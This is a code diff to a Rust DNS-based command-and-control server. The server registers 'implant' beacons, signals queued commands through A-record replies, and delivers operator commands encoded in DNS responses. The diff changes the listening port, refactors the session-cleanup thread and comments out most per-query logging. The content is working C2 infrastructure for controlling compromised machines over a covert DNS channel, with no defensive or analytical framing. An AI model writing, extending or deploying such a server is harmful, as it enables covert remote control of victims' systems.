@@ -9,7 +9,7 @@ use std::time::Duration;
 fn main() -> std::io::Result<()> {
     print_banner();
 
-    let socket = UdpSocket::bind("0.0.0.0:5353")?;
+    let socket = UdpSocket::bind("0.0.0.0:55353")?;
     let c2_state = Arc::new(Mutex::new(C2State::new()));
 
     // Start CLI thread
@@ -18,41 +18,37 @@ fn main() -> std::io::Result<()> {
         cli_loop(cli_state);
     });
 
-    
     // Start cleanup thread - runs every 60 seconds
     let cleanup_state = Arc::clone(&c2_state);
-    thread::spawn(move || {
-        loop {
-            thread::sleep(Duration::from_secs(60));
-            let mut state = cleanup_state.lock().unwrap();
-            let removed = state.cleanup_stale_sessions();
-            if removed > 0 {
-                println!("\n[!] Auto-cleanup removed {} stale session(s)", removed);
-                print!("c2> ");
-                io::stdout().flush().ok();
-            }
+    thread::spawn(move || loop {
+        thread::sleep(Duration::from_secs(60));
+        let mut state = cleanup_state.lock().unwrap();
+        let removed = state.cleanup_stale_sessions();
+        if removed > 0 {
+            println!("\n[!] Auto-cleanup removed {} stale session(s)", removed);
+            print!("c2> ");
+            io::stdout().flush().ok();
         }
     });
-
 
     let mut buf = [0u8; 512];
 
     loop {
         let (len, src) = socket.recv_from(&mut buf)?;
 
-        println!("\n[+] DNS Query from {}", src);
+        // if verbose() println!("\n[+] DNS Query from {}", src);
 
         match DnsHeader::from_bytes(&buf[..len]) {
             Ok(_header) => {
                 if let Ok(question) = parse_question(&buf, 12) {
-                    println!("    Domain: {} (Type: {:?})", question.name, question.qtype);
+                    // if verbose() println!("    Domain: {} (Type: {:?})", question.name, question.qtype);
 
                     if let Some(c2_req) = parse_c2_request(&question.name) {
                         let mut state = c2_state.lock().unwrap();
 
                         match c2_req {
                             C2Request::Beacon { implant_id } => {
-                                println!("    [BEACON] {}", implant_id);
+                                // if verbose() println!("    [BEACON] {}", implant_id);
                                 state.get_or_create_session(&implant_id);
                                 let has_cmds = state.has_commands(&implant_id);
                                 let response = build_a_record_response(
@@ -61,14 +57,14 @@ fn main() -> std::io::Result<()> {
                                     has_cmds,
                                 );
                                 socket.send_to(&response, src)?;
-                                println!(
+                                /* if verbose() println!(
                                     "    Response: {}",
                                     if has_cmds {
                                         "Commands queued"
                                     } else {
                                         "No commands"
                                     }
-                                );
+                                );*/
                             }
 
                             C2Request::FetchCommand { implant_id } => {
@@ -82,6 +78,9 @@ fn main() -> std::io::Result<()> {
                                             12 + question.name_length,
                                             &encoded,
                                         );
+
+                                        // println!("{:02x?}", response);
+
                                         socket.send_to(&response, src)?;
                                         println!("    Sent: {}", cmd);
                                     } else {
@@ -90,6 +89,7 @@ fn main() -> std::io::Result<()> {
                                             12 + question.name_length,
                                             "NONE",
                                         );
+
                                         socket.send_to(&response, src)?;
                                         println!("    No commands available");
                                     }
